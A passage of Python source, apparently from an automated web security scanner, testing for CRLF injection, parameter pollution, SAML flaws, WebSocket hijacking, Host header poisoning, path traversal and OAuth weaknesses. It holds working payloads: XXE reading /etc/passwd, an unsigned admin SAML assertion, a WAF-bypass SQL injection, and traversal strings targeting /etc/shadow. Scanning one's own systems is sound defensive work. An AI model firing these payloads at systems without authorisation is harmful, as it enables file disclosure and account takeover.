                r = await client.get(url, follow_redirects=False, timeout=7)
                body = r.text.lower()
                if "<script>" in body and "alert" in body and r.status_code == 200:
                    yield _finding("crlf", "crlf_xss_response_split", "high",
                        f"CRLF Injection → XSS via Response Splitting",
                        f"The `{param}` parameter reflects a CRLF-terminated payload that injects "
                        f"a script tag into the response body. This achieves XSS even when "
                        f"CSP `script-src 'self'` is present, because the script is in the same-origin response.",
                        f"URL: {url}\nStatus: {r.status_code}\nBody contains injected <script>",
                        url, True,
                        "Sanitise all redirect / header values. Strip CRLF characters. "
                        "Use a strict CSP including `Content-Type: text/html` validation.",
                        confidence="medium")
                    break
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── Log poisoning via User-Agent CRLF ─────────────────────────────────────
    try:
        crlf_ua = "Mozilla/5.0\r\nX-AttackTrace-CRLF: logged"
        r = await client.get(target, headers={"User-Agent": crlf_ua}, timeout=6)
        if r.status_code != 400:
            yield _finding("crlf", "crlf_log_poison_vector", "medium",
                "CRLF in User-Agent Not Rejected — Log Poisoning Vector",
                "The server accepted a request with a CRLF sequence in the User-Agent header "
                "without returning 400. If access logs are later included via LFI, "
                "the injected CRLF may corrupt or forge log entries.",
                f"User-Agent with CRLF → {r.status_code} (expected 400)",
                target, True,
                "Validate all incoming header values. Reject or sanitise CRLF in User-Agent. "
                "Ensure log viewers escape control characters.",
                confidence="low")
    except httpx.HTTPError:
        pass


# ── Module: HTTP Parameter Pollution ─────────────────────────────────────────

async def _module_hpp(target: str, client: httpx.AsyncClient, endpoints: set[str]) -> AsyncGenerator[dict, None]:
    """Test HTTP Parameter Pollution: ACL IDOR bypass, WAF evasion, backend divergence."""

    # ── Test 1: ACL bypass — duplicate ID param ───────────────────────────────
    # Pattern: auth check reads YOUR_ID (passes), business logic reads VICTIM_ID (wins)
    test_endpoints = [target + p for p in ["/api/resource", "/api/user", "/api/account",
                                            "/api/profile", "/api/order"]]
    # Also include crawled endpoints that look like they take an id param
    for ep in list(endpoints)[:20]:
        if any(k in ep for k in ["/user/", "/account/", "/order/", "/profile/", "/resource/"]):
            test_endpoints.append(ep)

    for url in test_endpoints[:8]:
        try:
            # Baseline: single id
            r_single = await client.get(url, params={"id": "1"}, timeout=6)
            # Duplicate: id=victim&id=attacker — PHP takes last, Node.js forms array
            r_dup = await client.get(url + "?id=1&id=2", timeout=6)
            if (r_dup.status_code in (200, 201) and
                    r_single.status_code != r_dup.status_code and
                    r_single.status_code in (401, 403)):
                yield _finding("hpp", "hpp_acl_bypass", "high",
                    "HTTP Parameter Pollution — ACL Bypass via Duplicate Parameter",
                    f"GET {url}?id=1 returns {r_single.status_code} (forbidden), but "
                    f"GET {url}?id=1&id=2 returns {r_dup.status_code}. "
                    f"The authorization check reads the first id=1 (yours) and passes, while "
                    f"the business logic reads the second id=2 (victim's). "
                    f"This mirrors the $13,500 HackerOne confirmed HPP IDOR pattern.",
                    f"URL: {url}\nSingle id: {r_single.status_code} → Duplicate id: {r_dup.status_code}",
                    url, True,
                    "Reject requests with duplicate parameter names. "
                    "Ensure all authorization checks read the same parameter that business logic uses.",
                    confidence="medium")
                break
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Test 2: WAF bypass via parameter splitting ────────────────────────────
    # WAF sees first q=safe, app uses second q=SQLi payload
    sqli_probe = "1' OR '1'='1"
    waf_bypass_url = f"{target}/search?q=safe&q={sqli_probe}"
    try:
        r_direct = await client.get(f"{target}/search?q={sqli_probe}", timeout=6)
        r_hpp    = await client.get(waf_bypass_url, timeout=6)
        if r_direct.status_code in (403, 400, 429) and r_hpp.status_code == 200:
            yield _finding("hpp", "hpp_waf_bypass", "high",
                "HTTP Parameter Pollution — WAF Bypass via Duplicate Parameter",
                "A SQLi payload in `?q=payload` returns "
                f"{r_direct.status_code} (blocked by WAF), but sending it as the second "
                f"duplicate parameter (`?q=safe&q=payload`) returns 200. "
                "The WAF evaluates the first (safe) value; the app processes the second (malicious).",
                f"Direct: {r_direct.status_code} → HPP: {r_hpp.status_code}\n"
                f"WAF-bypass URL: {waf_bypass_url}",
                waf_bypass_url, True,
                "Configure the WAF to reject requests with duplicate parameters, or set it to "
                "inspect all values, not just the first. Use parameterised queries to eliminate SQLi.",
                confidence="medium")
    except httpx.HTTPError:
        pass

    # ── Test 3: PHP vs Node.js divergence signal ──────────────────────────────
    # Server header can confirm which last/first/array behaviour to expect
    try:
        r = await client.get(target, timeout=6)
        server = r.headers.get("server", "").lower()
        x_powered = r.headers.get("x-powered-by", "").lower()
        if "php" in x_powered or "apache" in server:
            yield _finding("hpp", "hpp_php_last_value", "info",
                "HPP Risk: PHP/Apache — Last Duplicate Parameter Value Wins",
                "PHP (and Apache mod_php) uses the LAST value when duplicate parameters are sent. "
                "Combined with an application that uses the FIRST value for auth checks, "
                "HPP ACL bypass is possible: auth sees YOUR_ID (first), app acts on VICTIM_ID (last).",
                f"Server: {server or 'unknown'}\nX-Powered-By: {x_powered or 'unknown'}",
                target, False,
                "Test `?id=YOUR_ID&id=VICTIM_ID` on all resource endpoints. "
                "Reject duplicate parameters at the framework level.",
                confidence="high")
        elif "node" in x_powered or "express" in x_powered:
            yield _finding("hpp", "hpp_node_array", "info",
                "HPP Risk: Node.js/Express — Duplicate Parameters Form an Array",
                "Express.js (via `qs` library) converts duplicate parameters into an array. "
                "If authorization checks `req.query.id === userID` (string comparison) but "
                "the array `[userID, victimID]` coerces truthy, HPP bypass may be possible.",
                f"X-Powered-By: {x_powered}",
                target, False,
                "Validate that authorization checks perform strict type comparison "
                "and cannot be confused by array inputs from duplicate parameters.",
                confidence="medium")
    except httpx.HTTPError:
        pass


# ── Module: SAML Attacks ──────────────────────────────────────────────────────

async def _module_saml(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """Probe SAML endpoints: signature wrapping, attribute pollution, XXE in SAMLResponse."""

    saml_paths = [
        "/saml/acs", "/saml/consume", "/sso/saml", "/auth/saml/callback",
        "/api/saml/acs", "/saml2/acs", "/sso/saml2", "/login/saml",
        "/Saml2/Acs", "/auth/sso", "/sso",
    ]

    saml_endpoint = None
    for path in saml_paths:
        try:
            r = await client.get(target + path, timeout=6, follow_redirects=False)
            if r.status_code in (200, 302, 405, 400):
                saml_endpoint = target + path
                break
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    if saml_endpoint is None:
        # Check for IdP redirect or SSO link on main page
        try:
            r = await client.get(target, timeout=8)
            body = r.text.lower()
            if "saml" in body or "sso" in body or "shibboleth" in body:
                yield _finding("saml", "saml_endpoint_detected", "info",
                    "SAML / SSO References Detected in Page",
                    "The target page references SAML or SSO keywords. "
                    "SAML endpoints should be tested for signature wrapping and attribute pollution. "
                    "Use Burp Suite's SAML Raider extension for thorough testing.",
                    f"Keywords found: {[k for k in ['saml', 'sso', 'shibboleth'] if k in body]}\n"
                    f"No ACS endpoint responding — manual probe recommended.",
                    target, False,
                    "Test SAML responses with SAML Raider (Burp extension) for signature wrapping "
                    "and attribute pollution before going live.",
                    confidence="low")
            return
        except httpx.HTTPError:
            return

    yield _finding("saml", "saml_endpoint_found", "info",
        "SAML ACS Endpoint Detected",
        f"A SAML Assertion Consumer Service (ACS) endpoint was found at `{saml_endpoint}`. "
        "SAML endpoints are a Critical-severity attack surface. "
        "Known attacks: XML Signature Wrapping (attacker-controlled assertion alongside signed one), "
        "attribute pollution (duplicate role attributes where Ruby takes LAST = admin), "
        "and void canonicalization (PortSwigger 2025 nomination).",
        f"Endpoint: {saml_endpoint}",
        saml_endpoint, False,
        "Test with Burp Suite SAML Raider. Ensure XML signature validation uses "
        "strict canonicalization. Reject SAMLResponse with unsigned assertions. "
        "Use the ID attribute of the signed Assertion, not position.",
        confidence="high")

    # ── Test 1: XXE in SAMLResponse ───────────────────────────────────────────
    import base64 as _b64
    xxe_saml = """<?xml version="1.0"?>
<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:AttributeStatement>
      <saml:Attribute Name="email">
        <saml:AttributeValue>&xxe;</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>"""
    encoded = _b64.b64encode(xxe_saml.encode()).decode()
    try:
        r = await client.post(saml_endpoint,
                              data={"SAMLResponse": encoded, "RelayState": ""},
                              timeout=8)
        body = r.text
        if "root:" in body or "/bin/" in body or "nobody:" in body:
            yield _finding("saml", "saml_xxe_rce", "critical",
                "XXE in SAML SAMLResponse — File Disclosure Confirmed",
                f"Sending a SAMLResponse with an XXE payload (`<!ENTITY xxe SYSTEM \"file:///etc/passwd\">`) "
                f"to {saml_endpoint} returned the server's /etc/passwd in the response body. "
                "This demonstrates blind XXE or direct file disclosure via SAML XML parsing.",
                f"Response body: {body[:300]}",
                saml_endpoint, True,
                "Disable XML external entity processing in the SAML library. "
                "Use `libxml_disable_entity_loader(true)` (PHP) or equivalent. "
                "Validate and reject DTD declarations in SAMLResponse.",
                confidence="high")
        elif r.status_code not in (400, 415) and "error" not in body.lower()[:100]:
            yield _finding("saml", "saml_xxe_no_rejection", "medium",
                "SAML ACS Accepts DTD Declarations — Possible XXE",
                f"POST to {saml_endpoint} with a SAMLResponse containing a DOCTYPE/XXE declaration "
                f"returned {r.status_code} (not rejected with 400). "
                "The XML parser may process external entities — manual verification needed.",
                f"SAMLResponse with XXE payload → {r.status_code}",
                saml_endpoint, True,
                "Disable XML external entities. Test with an OOB XXE payload using Burp Collaborator.",
                confidence="low")
    except httpx.HTTPError:
        pass

    # ── Test 2: Signature wrapping hint ──────────────────────────────────────
    # We can't forge signatures, but can detect if unsigned assertions are rejected
    unsigned_saml = _b64.b64encode(b"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="INJECTED">
  <saml:Assertion ID="INJECTED">
    <saml:Subject>
      <saml:NameID>attacker@evil.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>""").decode()
    try:
        r = await client.post(saml_endpoint,
                              data={"SAMLResponse": unsigned_saml, "RelayState": ""},
                              timeout=8)
        if r.status_code in (200, 302) and r.status_code != 400:
            yield _finding("saml", "saml_unsigned_assertion_not_rejected", "critical",
                "SAML ACS Does Not Reject Unsigned Assertions",
                f"POST to {saml_endpoint} with a completely unsigned SAMLResponse "
                f"returned {r.status_code}. A properly configured SAML SP must return 400 "
                f"or redirect to an error page for unsigned assertions. "
                "If not validated, an attacker can craft arbitrary assertions to authenticate as any user.",
                f"Unsigned SAMLResponse → {r.status_code} (expected 400 / error redirect)",
                saml_endpoint, True,
                "Configure the SAML SP library to require signed Assertions. "
                "Reject responses where the Assertion lacks a valid ds:Signature. "
                "Use SAML Raider to test signature stripping and wrapping.",
                confidence="medium")
    except httpx.HTTPError:
        pass


# ── Module: WebSocket Security ────────────────────────────────────────────────

async def _module_websocket(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """Detect Cross-Site WebSocket Hijacking (CSWSH) and unauthenticated WS endpoints."""

    # ── Step 1: Find WebSocket endpoints from page source ────────────────────
    ws_urls: list[str] = []
    try:
        r = await client.get(target, timeout=8)
        body = r.text
        # Extract ws:// or wss:// URLs from page/JS
        for match in re.finditer(r'(?:wss?://|["\'])((?:/[^\'"]+)?(?:ws|socket|chat|realtime|events|hub|feed)[^\s\'"<>]*)',
                                  body, re.IGNORECASE):
            raw = match.group(1)
            if raw.startswith("ws"):
                ws_urls.append(raw)
            elif raw.startswith("/"):
                scheme = "wss" if target.startswith("https") else "ws"
                host = urlparse(target).netloc
                ws_urls.append(f"{scheme}://{host}{raw}")
    except httpx.HTTPError:
        pass

    # Common WebSocket paths to probe
    common_ws_paths = ["/ws", "/websocket", "/socket.io/", "/cable", "/hub",
                       "/api/ws", "/api/socket", "/chat", "/realtime", "/events/stream"]
    parsed = urlparse(target)
    ws_scheme = "wss" if parsed.scheme == "https" else "ws"
    for path in common_ws_paths:
        ws_urls.append(f"{ws_scheme}://{parsed.netloc}{path}")

    # Deduplicate
    ws_urls = list(dict.fromkeys(ws_urls))[:10]

    if not ws_urls:
        return

    # ── Step 2: HTTP upgrade probe (use HTTP client to check 101/400) ────────
    for ws_url in ws_urls:
        http_url = ws_url.replace("wss://", "https://").replace("ws://", "http://")
        try:
            r = await client.get(http_url,
                headers={"Upgrade": "websocket", "Connection": "Upgrade",
                         "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                         "Sec-WebSocket-Version": "13"},
                timeout=6, follow_redirects=False)
            if r.status_code in (101, 200, 400):
                # Check CSWSH: re-probe with a cross-origin Origin header
                r_cross = await client.get(http_url,
                    headers={"Upgrade": "websocket", "Connection": "Upgrade",
                             "Origin": "https://evil-attacker.com",
                             "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                             "Sec-WebSocket-Version": "13"},
                    timeout=6, follow_redirects=False)
                if r_cross.status_code in (101, 200):
                    yield _finding("websocket", "cswsh_no_origin_check", "high",
                        "Cross-Site WebSocket Hijacking (CSWSH) — Origin Not Validated",
                        f"The WebSocket endpoint `{ws_url}` accepted an upgrade request with "
                        f"`Origin: https://evil-attacker.com` (returned {r_cross.status_code}). "
                        f"Unlike XMLHttpRequest, WebSocket connections are not subject to CORS — "
                        f"the browser will send cookies automatically. An attacker-controlled page "
                        f"can open this WebSocket and exfiltrate all messages from a logged-in victim.",
                        f"WS endpoint: {ws_url}\nCross-origin upgrade → {r_cross.status_code}",
                        http_url, True,
                        "Validate the `Origin` header on every WebSocket upgrade request. "
                        "Reject connections from unexpected origins. "
                        "Implement a CSRF token in the WebSocket handshake URL or as a first message.",
                        confidence="medium")
                elif r.status_code == 101 and r_cross.status_code in (403, 400):
                    yield _finding("websocket", "ws_origin_check_present", "info",
                        f"WebSocket Endpoint Found — Origin Check Present",
                        f"WebSocket at `{ws_url}` appears to validate the Origin header. "
                        "Same-origin upgrade accepted; cross-origin upgrade rejected.",
                        f"Same-origin: {r.status_code} → Cross-origin: {r_cross.status_code}",
                        http_url, False,
                        "Continue validating Origin on every WS connection. "
                        "Also ensure authentication tokens are required in the handshake.",
                        confidence="medium")
                else:
                    yield _finding("websocket", "ws_endpoint_found", "info",
                        f"WebSocket Endpoint Detected — Manual CSWSH Testing Required",
                        f"A WebSocket endpoint was detected at `{ws_url}` (HTTP {r.status_code}). "
                        "Full CSWSH testing requires a real browser. Use Burp Suite to intercept "
                        "the WS handshake and replay it with a cross-origin Origin header.",
                        f"Endpoint: {ws_url}\nUpgrade probe: {r.status_code}",
                        http_url, False,
                        "Test manually: intercept WS handshake in Burp, change Origin to evil.com. "
                        "If the server sends user data, CSWSH is confirmed.",
                        confidence="low")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: Host Header Injection ────────────────────────────────────────────

async def _module_host_header(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """
    Host Header Injection — password reset poisoning, cache deception, routing bypass.

    Attack surface:
    - Password reset emails that embed the Host header in the reset link
    - Reverse proxies that route internally based on Host (can expose internal services)
    - Caching layers that cache per-path but serve attacker's Host in responses
    """
    parsed = urlparse(target)
    real_host = parsed.netloc
    attacker_host = "attacker-controlled.example.com"

    # ── Test 1: Password reset poisoning ─────────────────────────────────────
    # Real-world: if /forgot-password or /reset POSTs embed Host in reset link,
    # an attacker who can set Host can steal the reset token.
    reset_paths = [
        "/forgot-password", "/password-reset", "/auth/forgot",
        "/api/auth/forgot-password", "/api/users/forgot-password",
        "/accounts/password/reset/", "/user/forgot", "/api/password/reset",
    ]
    for path in reset_paths:
        url = target + path
        yield _probe("host_header", "POST", url, payload=f"Host: {attacker_host}",
                     note="password reset host poisoning probe")
        try:
            r = await client.post(
                url,
                headers={"Host": attacker_host, "X-Forwarded-Host": attacker_host},
                json={"email": "victim@example.com"},
                timeout=8,
            )
            yield _probe("host_header", "POST", url, status=r.status_code, size=len(r.content))
            # Any 2xx response to a poisoned Host is suspicious
            if r.status_code in (200, 201, 202, 204):
                body = r.text.lower()
                if any(kw in body for kw in ["reset", "email", "sent", "check", "link", "password"]):
                    yield _finding("host_header", "host_header_password_reset", "high",
                        "Host Header Injection — Password Reset Poisoning Vector",
                        f"The password reset endpoint `{path}` accepted a request with "
                        f"`Host: {attacker_host}` (HTTP {r.status_code}) and returned a response "
                        f"indicating an email was triggered. If the reset link is built from the "
                        f"Host header, an attacker can intercept victim reset tokens by poisoning "
                        f"the Host header in a proxy or via a cache.",
                        f"URL: {url}\nPoisoned Host: {attacker_host}\nResponse: {r.status_code}\n"
                        f"Body snippet: {r.text[:300]}",
                        url, True,
                        "Never build reset URLs from the Host header. Use an explicit base URL "
                        "configured server-side (e.g. FRONTEND_URL env var). "
                        "Validate the Host header against an allowlist at the web layer.",
                        confidence="high")
                    break
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Test 2: Cache poisoning via X-Forwarded-Host ──────────────────────────
    # Some caches key on path but serve whatever the app reflects in Location/links.
    for path in ["/", "/login", "/home", "/dashboard"]:
        url = target + path
        yield _probe("host_header", "GET", url, payload=f"X-Forwarded-Host: {attacker_host}",
                     note="cache poisoning via X-Forwarded-Host")
        try:
            r = await client.get(url, headers={"X-Forwarded-Host": attacker_host}, timeout=8)
            yield _probe("host_header", "GET", url, status=r.status_code, size=len(r.content))
            if r.status_code == 200 and attacker_host in r.text:
                yield _finding("host_header", "host_header_reflected", "high",
                    "Host Header Reflected in Response — Cache Poisoning / Open Redirect Risk",
                    f"The response to `{path}` with `X-Forwarded-Host: {attacker_host}` reflects "
                    f"the attacker-controlled hostname in the response body. If this response is "
                    f"cached (even for a fraction of a second), other users will receive the "
                    f"poisoned version, potentially redirecting them or loading attacker resources.",
                    f"URL: {url}\nX-Forwarded-Host: {attacker_host}\n"
                    f"Reflected in body: yes\nSnippet: {r.text[max(0,r.text.find(attacker_host)-30):r.text.find(attacker_host)+80]}",
                    url, True,
                    "Do not reflect the Host/X-Forwarded-Host header in responses. "
                    "Add `Vary: Host` or ensure your cache key includes the Host header. "
                    "Validate Host against an allowlist before trusting it.",
                    confidence="high")
                break
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Test 3: Routing bypass via ambiguous Host ─────────────────────────────
    # Some reverse proxies route to internal services when an unexpected Host is sent.
    bypass_hosts = ["localhost", "127.0.0.1", "internal", f"{real_host}.attacker.com"]
    for bhost in bypass_hosts:
        try:
            r = await client.get(target, headers={"Host": bhost}, timeout=6, follow_redirects=False)
            yield _probe("host_header", "GET", target, status=r.status_code,
                         payload=f"Host: {bhost}", note="routing bypass via bogus Host")
            if r.status_code == 200:
                body = r.text.lower()
                internal_signals = ["admin", "internal", "debug", "phpinfo", "server info",
                                     "test page", "welcome to nginx", "it works"]
                if any(s in body for s in internal_signals):
                    yield _finding("host_header", "host_header_internal_route", "critical",
                        f"Host Header Routing Bypass — Internal Service Exposed",
                        f"Sending `Host: {bhost}` to {target} returned HTTP 200 with internal/debug "
                        f"content. The reverse proxy may be routing to an unintended backend based "
                        f"on the Host header, exposing an internal service to external traffic.",
                        f"Poisoned Host: {bhost}\nResponse: {r.status_code}\n"
                        f"Internal signals: {[s for s in internal_signals if s in body]}",
                        target, True,
                        "Configure the reverse proxy to validate the Host header against a strict "
                        "allowlist. Return 400 for unknown hosts. "
                        "Never route to internal services based solely on the Host header.",
                        confidence="medium")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: Path Traversal / Local File Inclusion ────────────────────────────

async def _module_path_traversal(target: str, client: httpx.AsyncClient,
                                  endpoints: set[str]) -> AsyncGenerator[dict, None]:
    """
    Path traversal and LFI detection with encoding variations and OS-specific targets.

    Tests:
    - Classic `../` with various depths
    - Double URL encoding (%252e%252e%252f)
    - Null-byte injection (path%00.jpg)
    - Windows path separators
    - PHP stream wrappers
    """
    # Traversal sequences in various encodings
    _TRAVERSAL_SEQS = [
        "../" * 6,                          # Classic
        "..%2F" * 6,                        # URL-encoded /
        "%2e%2e%2f" * 6,                    # URL-encoded ../ chars
        "%252e%252e%252f" * 6,              # Double-encoded (WAF bypass)
        "..\\..\\..\\..\\..\\..\\",         # Windows backslash
        "....//....//....//....//....//",   # Stripped ../ → ../
    ]
    # Target files for each OS
    _LINUX_TARGETS = ["etc/passwd", "etc/shadow", "etc/hosts", "proc/self/environ"]
    _WIN_TARGETS   = ["windows/win.ini", "windows/system32/drivers/etc/hosts"]
    _PHP_WRAPPERS  = [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=../config.php",
    ]
    _LFI_INDICATORS = [
        "root:x:", "nobody:", "[fonts]", "[extensions]", "PATH=",  # /etc/passwd, win.ini
        "127.0.0.1", "localhost",                                    # /etc/hosts
    ]

    # Parameters that commonly lead to file inclusion
    lfi_params = ["file", "path", "page", "include", "template", "view", "load",
                  "doc", "document", "filename", "filepath", "dir", "folder"]

    # Also look at crawled URL params
    param_urls = set()
    for ep in list(endpoints)[:30]:
        if "?" in ep:
            param_urls.add(ep)

    hit: set[str] = set()

    # ── Phase 1: URL parameter LFI ───────────────────────────────────────────
    for param in lfi_params[:6]:
        if param in hit:
            continue
        for seq in _TRAVERSAL_SEQS[:3]:
            for target_file in (_LINUX_TARGETS[:2] + _WIN_TARGETS[:1]):
                payload = f"{seq}{target_file}"
                test_url = f"{target}?{param}={payload}"
                yield _probe("path_traversal", "GET", test_url, payload=payload,
                             note=f"LFI param={param}")
                try:
                    r = await client.get(test_url, timeout=8, follow_redirects=False)
                    yield _probe("path_traversal", "GET", test_url, status=r.status_code,
                                 size=len(r.content))
                    if r.status_code == 200 and any(ind in r.text for ind in _LFI_INDICATORS):
                        hit.add(param)
                        yield _finding("path_traversal", "lfi_url_param", "critical",
                            f"Local File Inclusion via '{param}' Parameter",
                            f"The `{param}` parameter allows reading local server files. "
                            f"Payload `{payload}` returned content matching OS file signatures. "
                            f"This allows reading /etc/passwd, application source code, config files "
                            f"containing credentials, and environment variables.",
                            f"URL: {test_url}\nPayload: {payload}\n"
                            f"Response snippet: {r.text[:400]}",
                            test_url, True,
                            "Never pass user input directly to file-reading functions. "
                            "Implement a strict allowlist of permitted file paths. "
                            "Chroot the web server or run in a container with minimal filesystem access.",
                            confidence="high")
                        break
                except httpx.HTTPError:
                    pass
                await asyncio.sleep(0)
            if param in hit:
                break

    # ── Phase 2: PHP stream wrapper test ─────────────────────────────────────
    for param in lfi_params[:4]:
        for wrapper in _PHP_WRAPPERS:
            test_url = f"{target}?{param}={wrapper}"
            yield _probe("path_traversal", "GET", test_url, payload=wrapper, note="PHP wrapper test")
            try:
                r = await client.get(test_url, timeout=8, follow_redirects=False)
                yield _probe("path_traversal", "GET", test_url, status=r.status_code,
                             size=len(r.content))
                # PHP wrapper returns base64 — check for long b64-looking string
                if r.status_code == 200 and len(r.text) > 50:
                    import base64 as _b64check
                    try:
                        # If it decodes cleanly to PHP-looking content it's LFI
                        decoded = _b64check.b64decode(r.text.strip()).decode("utf-8", errors="ignore")
                        if "<?php" in decoded or "<?=" in decoded or "define(" in decoded:
                            yield _finding("path_traversal", "php_wrapper_lfi", "critical",
                                f"PHP Stream Wrapper LFI — Source Code Disclosure via '{param}'",
                                f"The `php://filter` wrapper via `{param}` returned what appears to be "
                                f"base64-encoded PHP source code. Server-side PHP source is fully "
                                f"readable including hardcoded credentials and business logic.",
                                f"URL: {test_url}\nWrapper: {wrapper}\n"
                                f"Decoded snippet: {decoded[:300]}",
                                test_url, True,
                                "Disable allow_url_include and allow_url_fopen in php.ini. "
                                "Validate file includes against a strict allowlist. "
                                "Never expose the document root to user-controlled path parameters.",
                                confidence="high")
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── Phase 3: Null-byte injection (PHP < 5.3.4) ───────────────────────────
    for param in lfi_params[:4]:
        null_payload = "../../../etc/passwd%00.jpg"
        test_url = f"{target}?{param}={null_payload}"
        yield _probe("path_traversal", "GET", test_url, payload=null_payload,
                     note="null-byte injection to bypass extension check")
        try:
            r = await client.get(test_url, timeout=8, follow_redirects=False)
            yield _probe("path_traversal", "GET", test_url, status=r.status_code, size=len(r.content))
            if r.status_code == 200 and "root:x:" in r.text:
                yield _finding("path_traversal", "null_byte_lfi", "critical",
                    f"Null-Byte LFI — Extension Restriction Bypassed via '%00'",
                    f"Null-byte injection in `{param}` parameter truncated the appended extension, "
                    f"allowing /etc/passwd to be read. This affects PHP < 5.3.4 and some older CGI setups.",
                    f"URL: {test_url}\nPasswd content detected in response",
                    test_url, True,
                    "Upgrade to PHP 5.3.4+. Validate file paths against an allowlist of permitted names. "
                    "Use realpath() and basename() to normalize before any file operation.",
                    confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: OAuth Advanced Attacks ───────────────────────────────────────────

async def _module_oauth_advanced(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """
    Advanced OAuth 2.0 security testing beyond basic redirect_uri checking:
    - PKCE bypass (authorization without code_challenge)
    - Scope escalation (requesting more scopes than originally granted)
    - Token leakage in Referer header (implicit flow, fragment exposure)
    - Client secret exposure in JavaScript
    - State parameter absence (CSRF on OAuth flow)
    - Authorization code reuse (codes should be single-use)
    """
    parsed = urlparse(target)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    # ── Find OAuth / OIDC endpoints ───────────────────────────────────────────
    oauth_paths = [
        "/.well-known/oauth-authorization-server",
        "/.well-known/openid-configuration",
        "/oauth/authorize", "/oauth2/authorize", "/oauth/token",
        "/connect/authorize", "/auth/oauth2/authorize",
        "/api/oauth/authorize", "/login/oauth/authorize",
    ]
    oauth_base: str | None = None
    oidc_config: dict = {}

    for path in oauth_paths[:5]:
        url = target + path
        yield _probe("oauth_advanced", "GET", url, note="OAuth/OIDC endpoint discovery")
        try:
            r = await client.get(url, timeout=8, follow_redirects=False)
            yield _probe("oauth_advanced", "GET", url, status=r.status_code, size=len(r.content))
            if r.status_code == 200:
                if path.startswith("/.well-known"):
                    try:
                        oidc_config = r.json()
                        oauth_base = oidc_config.get("authorization_endpoint", target + "/oauth/authorize")
                        yield _finding("oauth_advanced", "oidc_discovery_found", "info",
                            "OIDC/OAuth Discovery Endpoint Found",
                            f"The OpenID Connect discovery document at `{url}` exposes the full "
                            f"server configuration including endpoints, supported grant types, "
                            f"and supported scopes. Useful for attack surface mapping.",
                            f"URL: {url}\nEndpoints: authorization={oidc_config.get('authorization_endpoint')}, "
                            f"token={oidc_config.get('token_endpoint')}\n"
                            f"Grant types: {oidc_config.get('grant_types_supported', [])}",
                            url, False,
                            "Restrict the discovery document to internal clients if not needed publicly. "
                            "Remove deprecated grant types (implicit, password).",
                            confidence="high")
                    except Exception:
                        pass
                if not oauth_base:
                    oauth_base = url
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    if not oauth_base:
        # No OAuth endpoint found — check main page for OAuth references
        try:
            r = await client.get(target, timeout=8)
            body = r.text.lower()
            oauth_signals = ["oauth", "authorization_code", "client_id", "redirect_uri",
                             "access_token", "openid", "scope=", "grant_type"]
            found = [s for s in oauth_signals if s in body]
            if found:
                yield _finding("oauth_advanced", "oauth_references_in_page", "info",
                    "OAuth References Detected in Page Source",
                    f"The page contains OAuth-related keywords ({found[:5]}). "
                    "OAuth flows should be tested for PKCE bypass, state parameter absence, "
                    "and redirect_uri manipulation.",
                    f"Signals: {found}\nRecommend manual OAuth flow analysis with Burp Suite.",
                    target, False,
                    "Test the OAuth flow manually. Ensure PKCE is enforced. "
                    "Verify the state parameter is present and validated.",
                    confidence="medium")
        except httpx.HTTPError:
            pass
        return

    # ── Test 1: Missing state parameter (CSRF on OAuth) ──────────────────────
    no_state_url = (f"{oauth_base}?response_type=code&client_id=test"
                    f"&redirect_uri={origin}/callback&scope=openid")
    yield _probe("oauth_advanced", "GET", no_state_url, note="OAuth authorize without state= (CSRF test)")
    try:
        r = await client.get(no_state_url, timeout=8, follow_redirects=False)
        yield _probe("oauth_advanced", "GET", no_state_url, status=r.status_code, size=len(r.content))
        if r.status_code in (200, 302):
            # If it redirected to the callback without rejecting missing state, flag it
            if r.status_code == 302:
                loc = r.headers.get("location", "")
                if "state=" not in loc:
                    yield _finding("oauth_advanced", "oauth_missing_state_csrf", "high",
                        "OAuth Authorization Without State Parameter Accepted",
                        "The authorization server accepted an OAuth request without a `state` parameter "
                        "and redirected to the callback. The `state` parameter is the primary CSRF "
                        "protection for OAuth flows. Without it, an attacker can initiate an authorization "
                        "flow and trick a victim into completing it (login CSRF / account linking CSRF).",
                        f"URL: {no_state_url}\nRedirect: {loc[:200]}",
                        no_state_url, True,
                        "Require the `state` parameter in all authorization requests. "
                        "Validate state on the callback and reject mismatches. "
                        "Consider using PKCE as additional protection.",
                        confidence="medium")
    except httpx.HTTPError:
        pass

    # ── Test 2: PKCE bypass (no code_challenge) ───────────────────────────────
    no_pkce_url = (f"{oauth_base}?response_type=code&client_id=test"
                   f"&redirect_uri={origin}/callback&scope=openid"
                   f"&state=random_csrf_token")
    yield _probe("oauth_advanced", "GET", no_pkce_url, note="OAuth without code_challenge (PKCE bypass)")
    try:
        r = await client.get(no_pkce_url, timeout=8, follow_redirects=False)
        yield _probe("oauth_advanced", "GET", no_pkce_url, status=r.status_code, size=len(r.content))
        if r.status_code in (200, 302):
